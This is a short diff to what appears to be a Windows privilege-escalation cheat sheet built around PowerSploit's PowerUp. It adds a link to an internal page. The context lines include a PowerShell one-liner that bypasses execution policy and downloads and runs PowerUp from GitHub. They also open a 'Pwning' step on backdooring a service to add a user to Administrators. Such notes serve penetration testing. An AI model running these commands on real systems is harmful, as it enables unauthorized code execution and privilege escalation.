@@ -26,6 +26,8 @@ PS C:\> Invoke-AllChecks [-HTMLReport] [| Out-File -Encoding ASCII checks.txt]
 C:\> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
 ```
 
+If you get errors or issues, do not forget to also check [PowerShellery](../guidelines/internal/PowerShellery.md)...
+
 ## Pwning
 ### Service executable permission or unquoted service path issues
 1. Backup the service and create a backdoored one which will add <user> to the localgroup Administrators:
